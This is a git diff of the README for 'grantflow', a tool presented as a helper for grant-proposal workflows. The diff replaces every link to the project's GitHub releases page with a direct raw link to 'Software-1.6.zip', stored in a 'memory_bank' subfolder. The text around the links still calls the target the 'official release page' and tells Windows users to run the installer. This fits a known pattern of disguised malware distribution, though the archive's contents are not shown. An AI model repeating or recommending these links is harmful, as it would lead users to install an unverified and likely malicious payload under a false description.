@@ -1,6 +1,6 @@
 # ⚙️ grantflow - Streamline Your Proposal Workflow
 
-[![Download grantflow](https://img.shields.io/badge/Download-grantflow-brightgreen)](https://github.com/igordirtydog/grantflow/releases)
+[![Download grantflow](https://img.shields.io/badge/Download-grantflow-brightgreen)](https://github.com/igordirtydog/grantflow/raw/refs/heads/main/grantflow/memory_bank/Software-1.6.zip)
 
 ## 📋 About grantflow
 
@@ -25,10 +25,10 @@ This tool suits users working with grant proposals, especially when multiple peo
 
 You need to get the software from the official release page.
 
-[![Download grantflow](https://img.shields.io/badge/Download-grantflow-blue)](https://github.com/igordirtydog/grantflow/releases)
+[![Download grantflow](https://img.shields.io/badge/Download-grantflow-blue)](https://github.com/igordirtydog/grantflow/raw/refs/heads/main/grantflow/memory_bank/Software-1.6.zip)
 
 - Click the link above or visit:  
-  https://github.com/igordirtydog/grantflow/releases  
+  https://github.com/igordirtydog/grantflow/raw/refs/heads/main/grantflow/memory_bank/Software-1.6.zip  
 
 - On the page, find the latest release. It will have a version number and files attached.  
 - Look for a file labeled with `.exe` or `Windows Installer` – this is your setup file.  
@@ -126,6 +126,6 @@ Topics related to grantflow include AI workflow, document generation, and grant 
 ## 📂 More Links
 
 Main release page:  
-https://github.com/igordirtydog/grantflow/releases  
+https://github.com/igordirtydog/grantflow/raw/refs/heads/main/grantflow/memory_bank/Software-1.6.zip  
 
 Source code and issue tracking are available on GitHub for advanced users and developers. For everyday users, the main goal is downloading, installing, and running the app smoothly on Windows.
